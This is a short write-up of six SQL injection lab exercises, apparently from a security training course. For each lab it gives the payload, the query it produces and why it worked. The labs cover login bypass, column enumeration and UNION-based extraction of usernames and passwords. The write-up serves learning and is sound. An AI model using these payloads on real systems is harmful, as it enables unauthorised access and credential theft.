## Lab 1 — Retrieve hidden data

- **Payload:** `Gifts' OR 1=1--`
- **Query produced:**
  `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1;`
- **Why it worked:** `OR 1=1` always evaluates to true, so all products are returned regardless of category or release status.

## Lab 2 — Login bypass

- **Payload:** Username: `administrator'--`, Password: `test123`
- **Query produced:**
  `SELECT * FROM users WHERE username = 'administrator'--' AND password = 'test123';`
- **Why it worked:** The single quote closes the username string and `--` comments out the password condition, allowing login without a valid password.

## Lab 3 — UNION attack: Retrieve data from other tables

- **Payload:** `' UNION SELECT username, password FROM users--`
- **Query produced:**
  `SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users--' AND released = 1;`
- **Why it worked:** UNION combines the results of two SELECT queries. Both queries returned two compatible text columns, allowing usernames and passwords to be retrieved from the users table.

## Lab 4 — Determine the number of columns

- **Payload:** `' ORDER BY 1--`, `' ORDER BY 2--`, `' ORDER BY 3--`, `' ORDER BY 4--`
- **First failing attempt:** `ORDER BY 4`
- **Number of columns:** 3
- **Why it worked:** ORDER BY references columns by position. Referencing a column beyond the available number causes a database error.

## Lab 5 — Find a column containing text

- **Payload:** `' UNION SELECT NULL, 'a', NULL--`
- **Text-compatible column:** Second column (column 2).
- **Why it worked:** The second column accepts text values, so the UNION query successfully returned the string 'a'. A UNION fails when corresponding columns have incompatible data types.

## Lab 6 — Retrieve multiple values in a single column

- **Payload:** `' UNION SELECT NULL, username || '~' || password FROM users--`
- **Query produced:**
  `SELECT name, description FROM products WHERE category = '' UNION SELECT NULL, username || '~' || password FROM users--`
- **Why it worked:** The concatenation operator `||` combines username and password into one text column, using `~` as a separator.